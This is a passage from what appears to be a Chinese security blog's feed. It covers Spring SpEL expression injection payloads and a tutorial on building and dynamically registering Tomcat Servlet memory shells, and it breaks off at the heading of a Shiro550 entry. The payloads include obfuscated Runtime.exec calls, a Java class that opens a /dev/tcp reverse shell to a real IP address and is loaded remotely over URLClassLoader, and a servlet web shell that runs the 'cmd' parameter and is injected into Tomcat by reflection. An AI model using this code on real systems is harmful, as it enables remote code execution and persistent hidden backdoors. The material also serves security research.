<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JavaScript引擎通用PoC</span></span><br><span class="line">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;nashorn&quot;</span>).eval(<span class="string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la&quot;</span>+<span class="string">&quot;ng.Run&quot;</span>+<span class="string">&quot;time.getRu&quot;</span>+<span class="string">&quot;ntime().ex&quot;</span>+<span class="string">&quot;ec(s);&quot;</span>)</span><br><span class="line"> </span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(<span class="string">&quot;xxx&quot;</span>),)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// JavaScript引擎+反射调用</span></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)),)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// JavaScript引擎+URL编码</span></span><br><span class="line"><span class="comment">// 其中URL编码内容为：</span></span><br><span class="line"><span class="comment">// 不加最后的getInputStream()也行，因为弹计算器不需要回显</span></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(java.net.URLDecoder).decode(<span class="string">&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;</span>)),)</span><br></pre></td></tr></table></figure>

<p>最后也是成功执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740396782521-63a383c6-e9ed-4110-b03a-14438ff3164b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740396782521-63a383c6-e9ed-4110-b03a-14438ff3164b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="hZ0Qe">利用类加载攻击</h3>
<h4 id="oh6sk"><font style="color:rgb(79, 79, 79);">UrlClassloader</font></h4>
这个方法就是通过远程类加载

<p>首先构造一个恶意类(这里为反弹shell)，并打包为.jar包或者编译为.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exp</span><span class="params">(String address)</span>&#123;</span><br><span class="line">        address = address.replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/&quot;</span>+address+<span class="string">&quot;;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            p.start();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在将编译好的文件放在vps上，并起一个http服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">python3 -m http.server <span class="number">8990</span></span><br></pre></td></tr></table></figure>

<p>payload如下，然后监听2333端口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.net.URLClassLoader(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;<span class="keyword">new</span> <span class="title class_">java</span>.net.URL(<span class="string">&quot;http://101.36.122.13:8990/Exp.jar&quot;</span>)&#125;).loadClass(<span class="string">&quot;Exp&quot;</span>).getConstructors()[<span class="number">0</span>].newInstance(<span class="string">&quot;101.36.122.13:2333&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="H1gIO">AppClassLoader</h4>
<font style="color:rgb(77, 77, 77);">获取ClassLoader去加载本地的类</font>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//String cmdStr = &quot;new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL(&#x27;http://127.0.0.1:8888/&#x27;)&#125;).loadClass(\&quot;evil\&quot;).getConstructors()[0].newInstance()&quot;;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdStr</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.ClassLoader).getSystemClassLoader().loadClass(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();<span class="comment">//创建解析器</span></span><br><span class="line">        <span class="type">Expression</span> <span class="variable">exp</span> <span class="operator">=</span> parser.parseExpression(cmdStr);<span class="comment">//解析表达式</span></span><br><span class="line">        System.out.println( exp.getValue() );<span class="comment">//弹出计算器</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740399279702-bbb2fa4f-d226-45b7-bb69-31ed1bb972ea.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740399279702-bbb2fa4f-d226-45b7-bb69-31ed1bb972ea.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>表达式注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Servlet内存马</title>
    <url>/2025/03/19/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="kPHZw">Servlet内存马</h1>
<h2 id="EFVAE">前置基础</h2>
<h3 id="OKm2F">什么是Servlet</h3>
Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层

<p>它在应用程序中的位置如下图所示，很类似于中间件</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742362458150-b564e164-3480-4423-8101-a4559d02d4dc.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742362458150-b564e164-3480-4423-8101-a4559d02d4dc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="nye7G">Servlet请求处理过程</h3>
客户端发起http请求，比如get类型

<p>Servlet容器接收到请求，根据请求信息，封装为<code>HttpServletRequest</code>和<code>HttpServletResponse</code>对象，这就是我们的传参</p>
<p>Servlet容器调用<code>HttpServlet</code>的init方法，init方法旨在第一次请求时被调用</p>
<p>Servlet容器调用<code>service</code>方法</p>
<p><code>service</code>方法根据请求类型（这里为get请求），分别调用<code>doGet</code>或者<code>doPost</code>方法，这里我们调用<code>doGet</code>方法</p>
<p><code>doXXX</code>方法中是我们自己写的业务逻辑</p>
<p>业务逻辑处理完成，返回给Servlet容器，然后容器将结果返回给客户端</p>
<p>容器关闭时，会调用<code>destory</code>方法</p>
<h3 id="nmimY">环境配置</h3>

<p>我们首先需要创建一个JavaWeb项目</p>
<ul>
<li>JDK8u65</li>
<li>在pom.xml中导入tomcat的包</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">8.5</span><span class="number">.61</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h2 id="F0nyF">分析</h2>
<h3 id="gFIy2">Servlet接口分析</h3>
我们可以看一下Servlet接口中有哪些方法，每个方法的作用如下

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Servlet</span> &#123;  </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig var1)</span> <span class="keyword">throws</span> ServletException; <span class="comment">// init方法，创建好实例后会被立即调用，仅调用一次。  </span></span><br><span class="line"></span><br><span class="line">    ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>;<span class="comment">//返回一个ServletConfig对象，其中包含这个servlet初始化和启动参数  </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest var1, ServletResponse var2)</span> <span class="keyword">throws</span> ServletException, IOException;  <span class="comment">//每次调用该servlet都会执行service方法，service方法中实现了我们具体想要对请求的处理。  </span></span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getServletInfo</span><span class="params">()</span>;<span class="comment">//返回有关servlet的信息，如作者、版本和版权.  </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>;<span class="comment">//只会在当前servlet所在的web被卸载的时候执行一次，释放servlet占用的资源  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果说我们需要在一个地方中写入恶意代码，那么应该是需要写在<code>service</code>方法中</p>
<h4 id="yt1hF">小demo</h4>
接下来我们去构造一个恶意Servlet

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基础恶意类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletTest</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream));</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    res.getWriter().println(line);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                n.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>web.xml中配置如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>myServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span>  <span class="comment">&lt;!-- Servlet 的名称 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>ServletTest<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span>  <span class="comment">&lt;!-- Servlet 的全类名 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 2. 映射 Servlet 到 URL --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>myServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span>  <span class="comment">&lt;!-- 上面定义的 servlet 名称 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/myServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span>  <span class="comment">&lt;!-- URL 映射路径 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将tomcat运行起来后，访问<code>[http://localhost:8080/myServlet?cmd=whoami](http://localhost:8080/myServlet?cmd=whoami)</code>，成功执行命令并回显</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742364834647-20c69692-517b-4438-bdfc-df5f7e80cc60.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742364834647-20c69692-517b-4438-bdfc-df5f7e80cc60.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="tBAvW">注册流程分析</h3>

<p>tomcat解析xml文件的具体流程在这里不分析，我们直接看到解析xml文件后做注册的地方<code>ContextConfig#configureContext</code></p>
<p>注册大概流程如下</p>
<ol>
<li>创建一个wrapper</li>
<li>设置servlet的名字</li>
<li>设置servlet相关联的类</li>
<li>将wrapper加入到context中</li>
<li>配置路径</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">configureContext</span><span class="params">(WebXml webxml)</span> &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">            <span class="comment">//创建一个wrapper</span></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">            <span class="comment">// Description is ignored</span></span><br><span class="line">            <span class="comment">// Display name is ignored</span></span><br><span class="line">            <span class="comment">// Icons are ignored</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// jsp-file gets passed to the JSP Servlet as an init-param</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//预加载</span></span><br><span class="line">                <span class="comment">//serlvet一般在访问后创建，如果设置相关配置，即可在访问创建</span></span><br><span class="line">                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//设置servlet名字</span></span><br><span class="line">            wrapper.setName(servlet.getServletName());</span><br><span class="line">            Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">            <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">                wrapper.addSecurityReference(</span><br><span class="line">                        roleRef.getName(), roleRef.getLink());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//设置关联的类</span></span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();</span><br><span class="line">            <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">maxFileSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="type">long</span> <span class="variable">maxRequestSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">fileSizeThreshold</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxFileSize()) &#123;</span><br><span class="line">                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxRequestSize()) &#123;</span><br><span class="line">                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getFileSizeThreshold()) &#123;</span><br><span class="line">                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(</span><br><span class="line">                        multipartdef.getLocation(),</span><br><span class="line">                        maxFileSize,</span><br><span class="line">                        maxRequestSize,</span><br><span class="line">                        fileSizeThreshold));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setAsyncSupported(</span><br><span class="line">                        servlet.getAsyncSupported().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line">            <span class="comment">//将wrapper加入到context中</span></span><br><span class="line">            context.addChild(wrapper);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">                webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">            <span class="comment">//配置路径</span></span><br><span class="line">            context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>启动服务时走入该方法后，即可看到有两个自带的servlet和我们自己配置的serlvet</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742365258391-6cf31d8c-d65b-49ca-9581-f870eb693b8f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742365258391-6cf31d8c-d65b-49ca-9581-f870eb693b8f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="RawDe">实现</h2>
<h3 id="ijOdI">实现条件</h3>
要实现内存马，有两个条件

<ol>
<li>写一个servlet木马</li>
<li>将servlet注册入tomcat中</li>
</ol>
<h3 id="EOb1t">写servlet马</h3>

<p>我们仿照默认的Servlet来写一个恶意类，使我们的主机弹计算器即可（jsp中定义东西需要使用**&lt;%! %&gt;**）</p>
<p>若有需要，可以自行实现回显木马</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h3 id="SKVlQ">动态注册servlet</h3>

<p><strong>动态注册中分为两步</strong></p>
<ol>
<li>获取standardcontext</li>
<li>注册进tomcat</li>
</ol>
<h4 id="RI6hI">获取standardcontext</h4>

<p>在jsp中默认有一个request对象，这个对象中存在一个<code>getServletContext</code>方法，会获取一个servletContext</p>
<p>在动态调试中，我们可以看到，servletContext中存在一个<code>ApplicationContext</code>，而在ApplicationContext中即存在着<code>standardcontext</code>，是我们想要获取的对象</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739015119729-b05691d2-3ebf-4eb8-a52c-4a4a27ee1935.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739015119729-b05691d2-3ebf-4eb8-a52c-4a4a27ee1935.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>接下来我们就要通过<code>servletContext</code>来获取<code>standardcontext</code></p>
<p>由于私有属性无法直接被获取，所以我们要通过反射特性来获取属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">  <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span>(ApplicationContext) context.get(servletContext);</span><br><span class="line"></span><br><span class="line">  <span class="type">Field</span> <span class="variable">standardContext</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  standardContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">context1</span> <span class="operator">=</span> (StandardContext) standardContext.get(applicationContext);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h4 id="iBIuw">注册进tomcat</h4>
注册进tomcat就和下面分析的流程是一样的，但不需要加多余的判断等东西

<p>需要注意，注册的过程中多一个实例化Servlet并setServlet的步骤</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="comment">//获取standardcontext</span></span><br><span class="line">  <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">  <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span>(ApplicationContext) context.get(servletContext);</span><br><span class="line"></span><br><span class="line">  <span class="type">Field</span> <span class="variable">standardContext</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  standardContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">context1</span> <span class="operator">=</span> (StandardContext) standardContext.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">//注册进tomcat</span></span><br><span class="line">  <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context1.createWrapper();</span><br><span class="line">  wrapper.setName(<span class="string">&quot;MemServlet&quot;</span>);</span><br><span class="line">  wrapper.setServletClass(MemServlet.class.getName());</span><br><span class="line">  <span class="comment">//实例化Servlet</span></span><br><span class="line">  wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">MemServlet</span>());</span><br><span class="line"></span><br><span class="line">  context1.addChild(wrapper);</span><br><span class="line">  context1.addServletMappingDecoded(<span class="string">&quot;/mem&quot;</span>,<span class="string">&quot;MemServlet&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h4 id="hExho">激活</h4>

<p>想要访问内存马，就要访问我们创建的jsp文件，创建<strong>恶意类</strong>与<strong>servlet</strong>并注册进tomcat中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739015658597-798813c5-3d5e-43ef-bbbc-561ddb4093dc.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739015658597-798813c5-3d5e-43ef-bbbc-561ddb4093dc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>然后即可访问我们所设定的内存马路径，触发恶意代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739015701777-4f3b363a-8e57-43d6-90b4-07fbb8c49c03.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739015701777-4f3b363a-8e57-43d6-90b4-07fbb8c49c03.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>memShell</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro550</title>
    <url>/2025/03/03/Shiro550/</url>
